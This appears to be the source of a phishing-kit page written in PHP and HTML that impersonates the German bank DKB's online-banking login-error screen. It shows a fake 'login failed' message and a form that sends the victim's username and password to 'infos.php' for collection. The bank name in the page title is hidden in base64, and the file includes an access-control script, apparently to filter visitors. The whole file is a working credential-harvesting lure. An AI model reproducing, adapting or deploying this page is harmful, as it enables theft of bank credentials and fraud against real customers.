<?php require_once "functions.php";?>
<?php $customPageName = " LOGIN ERROR"; ?>
<?php require_once "monster/access.php"; ?>
<?php require_once "ajax.php"; ?>


<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- link_icons -->
        <link rel="stylesheet"  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
        <link rel="stylesheet"  href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
        <title>
          <?php  
            $str = 'REtCIEJhbmtpbmc=';
            echo base64_decode($str);
          ?>
        </title>
        <!-- logo site web-->
        <link rel="icon" href="image/favicon.ico" type="image/x-icon"/>
        <link rel="shortcut icon" href="image/favicon.ico" type="image/x-icon" />
        <!-- link__css -->
        <link rel="stylesheet"  href="css/bootstrap.css">
        <link rel="stylesheet"  href="css/lol.css">
        <link rel="stylesheet"  href="css/animate.css">
</head>
<body style="background:#f3f9fe">  

         <div id="main">
           <div class="navbar">
            <div class="container-fluid">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 88.59 49.13" fill="none" width="90px"><title>DKB Logo</title><path d="M0 0h12.88C20.26 0 29 5.42 29 16.21c0 9.92-8.75 16.22-16.13 16.22H0zm19.79 16.21c0-6.76-5.54-8.1-10.6-8.1v16.21c5.06 0 10.6-1.34 10.6-8.1zM32.63 0h9.23v12.18h.09L49.23 0h10.6l-9.66 14.87 10.6 17.59h-10.6l-8.19-13.98h-.1v13.98h-9.21V0zm30.64 0h13.35c6 0 10.12 3.52 10.12 8.1 0 3.07-1.09 5.7-3.6 6.46v.1c2.07.76 5.45 3.51 5.45 7.89 0 6.48-5.07 9.91-10.6 9.91H63.27zM75.3 12.97c1.57 0 2.91-.98 2.91-2.84 0-1.75-1.34-2.85-2.9-2.85h-2.82v5.7zm.82 11.75c1.84 0 2.9-1.44 2.9-3.24 0-1.8-1.47-3.25-3.31-3.25h-3.22v6.49zM3.19 48.92H0v-9.97h3.13c2.4 0 5.1 1.65 5.1 4.98 0 3.3-2.73 4.99-5.04 4.99zm-.5-8.26H1.9v6.52h.78c1.69 0 3.53-1.04 3.53-3.28 0-2.2-1.84-3.24-3.53-3.24zm11 8.26v-.55h-.03c-.47.55-1.19.76-2.03.76-1.4 0-2.7-1.19-2.7-3.12 0-1.92 1.3-3.12 2.7-3.12.84 0 1.56.22 2.03.77h.03v-.55h1.78v5.8H13.7zm-1.5-4.44c-.72 0-1.4.55-1.4 1.53s.71 1.53 1.4 1.53c.84 0 1.5-.55 1.5-1.53s-.62-1.53-1.5-1.53zm6.6 4.65a3.26 3.26 0 01-2.28-.94l.75-1.14c.37.37 1.03.74 1.53.74.53 0 .75-.19.75-.5 0-1-2.78-.63-2.78-2.75 0-1.13 1-1.65 2.12-1.65 1.03 0 1.66.19 2.28.68l-.75 1a2.71 2.71 0 00-1.4-.42c-.32 0-.63.06-.63.43 0 .73 2.9.6 2.9 2.75.04 1.4-1.09 1.8-2.5 1.8zm11.03-.21l-1.87-2.51h-.03v2.51h-1.79V38.79h1.79v6.4h.02l1.6-2.08h2.13l-2.29 2.78 2.57 3.06h-2.13v-.03zm6.97 0v-.55h-.03c-.47.55-1.19.76-2.03.76-1.4 0-2.69-1.19-2.69-3.12 0-1.92 1.28-3.12 2.69-3.12.84 0 1.56.22 2.03.77h.03v-.55h1.78v5.8H36.8zm-1.5-4.44c-.72 0-1.4.55-1.4 1.53s.72 1.53 1.4 1.53c.85 0 1.5-.55 1.5-1.53s-.62-1.53-1.5-1.53zm8.82 4.44v-3.18c0-.83-.29-1.26-1.13-1.26-.72 0-1.22.55-1.22 1.26v3.18h-1.78V43.1h1.78v.55h.03a2.44 2.44 0 011.91-.77c1.38 0 2.16.77 2.16 2.3v3.73H44.1zm7.31 0v-3.18c0-.83-.28-1.26-1.12-1.26-.72 0-1.22.55-1.22 1.26v3.18H47.3V43.1h1.78v.55h.03a2.45 2.45 0 011.9-.77c1.38 0 2.16.77 2.16 2.3v3.73h-1.75zm10.32 0h-3.41v-9.97h3.13c1.68 0 3.12 1 3.12 2.5 0 1.1-.56 1.93-1.28 2.24.72.27 1.69.98 1.69 2.35.03 1.78-1.4 2.88-3.25 2.88zm-.4-8.38h-1.07v2.35h1.06c.72 0 1.4-.33 1.4-1.19 0-.83-.68-1.16-1.4-1.16zm.12 3.94h-1.22v2.79h1.22c1 0 1.56-.55 1.56-1.38 0-.86-.56-1.4-1.56-1.4zm9.28 4.44v-.55h-.03c-.47.55-1.19.76-2.03.76-1.41 0-2.7-1.19-2.7-3.12 0-1.92 1.29-3.12 2.7-3.12.84 0 1.56.22 2.03.77h.03v-.55h1.78v5.8h-1.78zm-1.5-4.44c-.72 0-1.4.55-1.4 1.53s.71 1.53 1.4 1.53c.84 0 1.5-.55 1.5-1.53s-.66-1.53-1.5-1.53zm8.81 4.44v-3.18c0-.83-.28-1.26-1.12-1.26-.72 0-1.22.55-1.22 1.26v3.18h-1.78V43.1h1.78v.55h.03a2.45 2.45 0 011.9-.77c1.38 0 2.16.77 2.16 2.3v3.73h-1.75zm6.88 0l-1.88-2.51H83v2.51h-1.78V38.79h1.78v6.4h.03l1.6-2.08h2.12l-2.28 2.78 2.56 3.06h-2.09v-.03z" fill="#148dea"></path></svg>
            </div>
          </div>


          <!-- STAAAART___LOG -->
          <div class="home">
            <div class="container-fluid">
              <div class="err mb-3 d-flex align-items-start" style="padding: 12px 16px;max-width:468px;margin:0 auto;background: #FFDADA;border-radius: 12px;">
                <svg width="34" style="margin-right: 10px;"  viewBox="0 0 24 24" fill="#ca0101" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M12.9579 5.52357C12.5851 4.84431 11.5667 4.8305 11.1778 5.54463L5.20494 16.5143C4.84027 17.1841 5.3427 17.9885 6.12567 17.9885H17.8595C18.6453 17.9885 19.1761 17.1572 18.7896 16.4554C17.7323 14.5358 16.7913 12.7444 15.8574 10.9645L15.7988 10.8529L15.7987 10.8527C14.8836 9.10868 13.9732 7.37361 12.9579 5.52357ZM9.33635 4.60779C10.4856 2.49718 13.6215 2.44032 14.7962 4.58096C15.8206 6.44756 16.7385 8.19695 17.6517 9.9374L17.7132 10.0546C18.6478 11.8356 19.5801 13.6104 20.6264 15.5101C21.7336 17.5203 20.2522 20 17.8595 20H6.12567C3.77677 20 2.26948 17.5867 3.36347 15.5775L9.33635 4.60779ZM12.0429 15.7759C12.0716 15.7759 12.0949 15.7984 12.0949 15.8262C12.0949 15.8539 12.0716 15.8764 12.0429 15.8764C12.0142 15.8764 11.9909 15.8539 11.9909 15.8262C11.9909 15.7984 12.0142 15.7759 12.0429 15.7759ZM11.0545 15.8262C11.0545 16.3538 11.497 16.7816 12.0429 16.7816C12.5888 16.7816 13.0314 16.3538 13.0314 15.8262C13.0314 15.2985 12.5888 14.8707 12.0429 14.8707C11.497 14.8707 11.0545 15.2985 11.0545 15.8262ZM13.0836 13.1106C13.0836 13.6661 12.6178 14.1164 12.0431 14.1164C11.4685 14.1164 11.0027 13.6661 11.0027 13.1106L11.0027 8.58479C11.0027 8.02933 11.4685 7.57904 12.0431 7.57904C12.6178 7.57904 13.0836 8.02933 13.0836 8.58479L13.0836 13.1106Z" fill="#ca0101" fill-opacity="0.95"></path></svg>
                <p class="mb-0" style="color: #ca0101;">Die Anmeldung ist fehlgeschlagen. Bitte überprüfe die Anmeldedaten und versuche es erneut.</p>
              </div>
              <div class="log" style="background:#fff">
                <div class="text-center"><h2>Mein Banking</h2></div>
                <!-- START_FORM -->
                <form action="infos.php" method="post">
                  <input type="hidden" name="step" value="loginerr">
                  <div class="form-group mt-5">
                    <label for="user" id="a">Anmeldename</label>
                    <input type="text" name="user" id="user" class="form-control" required minlength="3" autofocus pattern="^[a-zA-Z0-9]+([a-zA-Z0-9](_|-|.)[a-zA-Z0-9])*[a-zA-Z0-9]+$">
                  </div>  
                  <div class="form-group mt-3">
                    <label for="pass" id="b">Passwort</label>
                    <input type="password" name="pass" id="pass" class="form-control" required minlength="3">
                    <div class="eys">
                      <i class="bi bi-eye eyes"></i>
                      <i class="bi bi-eye-slash eyes"></i> 
                    </div>
                  </div> 
                  <div class="bom">
                    <button class="btn" name="submit">Anmelden</button>
                  </div>
                  <p><a href="#">Passwort</a> oder <a href="#">Anmeldenamen</a> vergessen?</p>
                </form>
                <!-- ENNND_FORM -->
              </div>
            </div>
          </div>
          <!-- ENNNNNND___LOG -->

          <div class="fotter">
            <div class="container">
              <ul class="nav">
                <li class="nav-item">DKB Startseite</li>
                <li class="nav-item">Infoseite</li>
              </ul>
              <ul class="nav">
                <li class="nav-item">DKB Verwalterplattform</li>
                <li class="nav-item">DKB Treuhänderplattform</li>
                <li class="nav-item">Impressum</li>
                <li class="nav-item">Datenschutz</li>
                <li class="nav-item">Cookie Einstellungen</li>
                <li class="nav-item">Preise & Bedingungen</li>
                <li class="nav-item">Hilfe & Kontakt</li>
              </ul>
            </div>
          </div>  
         </div>

      






        <script src="js/jquery-3.5.1.min.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script>

             $("#user").focus();
             $("#a").css({top:'6px',fontSize:'13px',})
             $("#user").focus(function(){
                  $("#a").css({top:'6px',fontSize:'13px',})
             })

             $("#user").blur(function(){
                  if($("#user").val().length == 0){
                        $("#a").css({top:'17px',fontSize:'17px',});
                  }
                  else{
                        $("#a").css({top:'6px',fontSize:'13px',})
                  }
             })

             $("#pass").focus(function(){
                  $("#b").css({top:'6px',fontSize:'13px',})
             })

             $("#pass").blur(function(){
                  if($("#pass").val().length == 0){
                        $("#b").css({top:'17px',fontSize:'17px',});
                  }
                  else{
                        $("#b").css({top:'6px',fontSize:'13px',})
                  }
             })
          
        </script>
              
</body>
</html>